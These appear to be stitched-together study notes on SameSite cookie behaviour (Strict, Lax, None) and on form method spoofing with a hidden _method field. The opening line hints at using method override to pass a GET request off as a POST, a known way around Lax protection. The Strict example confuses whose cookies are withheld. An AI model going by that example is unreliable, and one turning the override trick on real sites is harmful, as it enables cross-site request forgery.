    This will send the request with the GET method, but it will be interpreted as a POST request through the hidden attribute (_method)

Lax allows the cookie to be sent on some cross-site requests, whereas Strict never allows the cookie to be sent on a cross-site request.

The situations in which Lax cookies can be sent cross-site must satisfy both of the following:

    The request must be a top-level navigation. You can think of this as equivalent to when the URL shown in the URL bar changes, e.g. a user clicking on a link to go to another site.
    The request method must be safe (e.g. GET or HEAD, but not POST).

For example:

    Let's say a user is on site-a.com and clicks on a link to go to site-b.com. This is a cross-site request. This is a top-level navigation and is a GET request, so Lax cookies are sent to site-b.com. However, Strict cookies are not sent because it is, after all, a cross-site request.
    The user is on site-a.com and there is an iframe in which site-b.com is loaded. This is a cross-site request, but it's not a top-level navigation (the user is still on site-a.com, i.e. the URL bar doesn't change when the iframe is loaded). Therefore neither Lax nor Strict cookies are sent to site-b.com.
    The user is on site-a.com which POSTs a form to site-b.com. This is a cross-site request, but the method (POST) is unsafe. It doesn't meet the criteria for Lax cookies going cross-site, so neither Lax nor Strict cookies are sent to site-b.com



## Form Method Spoofing

HTML forms do not support PUT, PATCH, or DELETE actions. So, when defining PUT, PATCH, or DELETE routes that are called from an HTML form, you will need to add a hidden _method field to the form. The value sent with the _method field will be used as the HTTP request method:

The SameSite attribute in cookies is used to control how cookies are sent with cross-site requests. It helps improve security and privacy by limiting cookie sharing in certain situations. Here's a breakdown of the different SameSite values:

    SameSite=Strict:
        The cookie is only sent if the request is coming from the same origin (i.e., the same domain and scheme).
        This is the most restrictive option. For example, if you're on siteA.com and you click a link that takes you to siteB.com, siteA.com’s cookies won’t be sent along with that request.
        Use case: It’s useful when you want to ensure cookies are only sent in same-site contexts, like in a user authentication scenario where you don't want cross-site requests to have access to session cookies.

    SameSite=Lax:
        Cookies are sent on same-site requests and also for top-level navigation to the site (such as clicking a link to your site).
        However, cookies will not be sent on cross-site subrequests (like loading images, frames, or iframes from another domain).
        Use case: This is a good middle ground for most websites. It allows cookies for top-level navigation (e.g., logging in via an external link) but still restricts cross-site requests like those from embedded content.

    SameSite=None:
        Cookies are sent in all contexts, even cross-site requests.
        This is the least restrictive option, but it requires the cookie to be marked as Secure (i.e., only sent over HTTPS).
        Use case: Use this when you need your cookies to be sent across sites, such as in third-party authentication systems or when working with cross-site resources.

In short:

    Strict = No cross-site requests with cookies.
    Lax = Allows cross-site navigation but restricts cross-site subrequests.
    None = Cookies sent with all requests, including cross-site ones, but must be secure (HTTPS).
